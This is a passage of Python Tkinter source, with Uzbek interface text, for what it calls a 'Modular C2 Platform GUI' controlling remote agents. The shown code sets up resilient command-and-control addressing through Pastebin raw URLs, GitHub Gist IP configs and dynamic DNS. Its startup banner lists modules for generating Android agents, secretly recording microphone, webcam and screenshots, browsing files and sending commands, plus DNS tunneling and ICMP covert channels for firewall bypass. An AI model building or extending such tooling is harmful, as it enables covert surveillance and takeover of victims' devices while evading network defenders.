        
        # Pastebin
        paste_frame = tk.LabelFrame(update_frame, text="📋 Pastebin", bg='#34495e',
                                   fg='white', font=('Arial', 10, 'bold'))
        paste_frame.pack(fill=tk.X, padx=20, pady=10)
        
        tk.Label(paste_frame, text="Raw URL:", bg='#34495e', fg='white').pack(anchor=tk.W, padx=10, pady=5)
        paste_url = tk.Entry(paste_frame, width=60)
        paste_url.pack(fill=tk.X, padx=10, pady=5)
        paste_url.insert(0, "https://pastebin.com/raw/xxxxx")
        
        def add_pastebin():
            url = paste_url.get().strip()
            if url:
                self.ip_updater.add_pastebin(url)
                messagebox.showinfo("✅ Qo'shildi", "Pastebin URL qo'shildi!\\n\\nAgent har 5 daqiqada yangi IP tekshiradi.")
        
        tk.Button(paste_frame, text="➕ Pastebin URL Qo'shish", command=add_pastebin,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(pady=10)
        
        # Tab 3: Config Generator
        config_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(config_frame, text="⚙️ Config Generator")
        
        tk.Label(config_frame, text="GitHub Gist uchun config yaratish:",
                font=('Arial', 10), bg='#34495e', fg='white').pack(pady=10)
        
        gen_frame = tk.Frame(config_frame, bg='#34495e')
        gen_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        tk.Label(gen_frame, text="Primary IP:", bg='#34495e', fg='white').grid(row=0, column=0, sticky=tk.W, pady=5)
        primary_ip = tk.Entry(gen_frame, width=30)
        primary_ip.grid(row=0, column=1, pady=5, padx=10)
        primary_ip.insert(0, "123.45.67.89")
        
        tk.Label(gen_frame, text="Backup IPs (har satrda 1ta):", bg='#34495e', fg='white').grid(row=1, column=0, sticky=tk.NW, pady=5)
        backup_ips = tk.Text(gen_frame, height=5, width=30)
        backup_ips.grid(row=1, column=1, pady=5, padx=10)
        backup_ips.insert("1.0", "98.76.54.32\\n11.22.33.44")
        
        tk.Label(gen_frame, text="Generated Config:", bg='#34495e', fg='white').grid(row=2, column=0, sticky=tk.NW, pady=10)
        config_text = tk.Text(gen_frame, height=10, width=50)
        config_text.grid(row=2, column=1, pady=10, padx=10)
        
        def generate_config():
            primary = primary_ip.get().strip()
            backups = [line.strip() for line in backup_ips.get("1.0", tk.END).split('\\n') if line.strip()]
            
            if primary:
                config = create_ip_config(primary, backups)
                config_text.delete("1.0", tk.END)
                config_text.insert("1.0", config)
                messagebox.showinfo("✅ Tayyor", "Config yaratildi!\\n\\nBu JSON ni GitHub Gist ga yuklang.")
        
        def copy_config():
            config = config_text.get("1.0", tk.END).strip()
            self.root.clipboard_clear()
            self.root.clipboard_append(config)
            messagebox.showinfo("✅ Nusxalandi", "Config clipboard ga nusxalandi!")
        
        btn_frame = tk.Frame(gen_frame, bg='#34495e')
        btn_frame.grid(row=3, column=1, pady=10)
        
        tk.Button(btn_frame, text="🔧 Generate", command=generate_config,
                 bg='#3498db', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        tk.Button(btn_frame, text="📋 Copy", command=copy_config,
                 bg='#27ae60', fg='white', font=('Arial', 9, 'bold')).pack(side=tk.LEFT, padx=5)
        
        # Tab 4: DDNS Info
        ddns_frame = tk.Frame(notebook, bg='#34495e')
        notebook.add(ddns_frame, text="🌐 DDNS Info")
        
        ddns_info = tk.Text(ddns_frame, wrap=tk.WORD, font=('Arial', 9), bg='#ecf0f1')
        ddns_info.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        ddns_text = """🌐 Dynamic DNS (DDNS) Providers

✅ TAVSIYA ETILADIGAN:

1. DuckDNS (duckdns.org)
   • To'liq bepul
   • Cheksiz subdomain
   • 5 daqiqada setup
   • yourname.duckdns.org

2. No-IP (noip.com)
   • 3 ta domain bepul
   • Eng mashhur
   • yourname.ddns.net

3. Cloudflare (cloudflare.com)
   • Professional
   • Bepul SSL/TLS
   • DDoS protection

📖 Batafsil ko'rsatma: docs/DYNAMIC_IP_GUIDE.md

💡 DDNS ishlatish:
   1. Account yarating
   2. Domain oling (yourname.duckdns.org)
   3. Auto-update script qo'shing
   4. Agent'da domain ishlatng (IP emas!)
   
Example:
   client.add_server('yourname.duckdns.org', 9999)
"""
        ddns_info.insert("1.0", ddns_text)
        ddns_info.config(state=tk.DISABLED)
        
        tk.Button(ddns_frame, text="📖 Batafsil Ko'rsatma",
                 command=lambda: os.startfile("docs/DYNAMIC_IP_GUIDE.md") if os.name == 'nt' else None,
                 bg='#3498db', fg='white', font=('Arial', 10, 'bold')).pack(pady=10)
    
    def run(self):
        """GUI ishga tushirish"""
        self.root.mainloop()


def main():
    print("\n" + "="*60)
    print("🎯 Modular C2 Platform GUI")
    print("="*60)
    print("\n📌 Modullar:")
    print("   ✅ mobile_payload_module.py - Android Agent Generator")
    print("   ✅ audio_module.py - Mikrofon / Ovoz yozish")
    print("   ✅ camera_module.py - Webcam / Camera")
    print("   ✅ screenshot_module.py - Screenshot olish")
    print("   ✅ file_browser_module.py - Fayl boshqaruvi")
    print("   ✅ agent_manager_module.py - Agent boshqaruvi")
    print("   ✅ command_sender_module.py - Komanda yuborish")
    print("\n📌 Qo'llab-quvvatlanadigan protokollar:")
    print("   🔵 TCP (9999) - Raw socket, tez")
    print("   🌐 HTTP (8080) - Firewall friendly")
    print("   🔒 HTTPS (8443) - SSL/TLS encrypted")
    print("   🔌 WebSocket (8765) - Real-time bidirectional")
    print("   📡 UDP (5353) - Connectionless, fast")
    print("   🌍 DNS (5353) - Tunneling, firewall bypass")
    print("   📶 ICMP (raw) - Ping covert channel")
    print("   📹 RTSP (8554) - Video streaming cover")
    print("\n💡 GUI'da protokol tanlang va serverga ulaning!\n")
    
    app = ModularC2GUI()
    app.run()


if __name__ == "__main__":
    main()
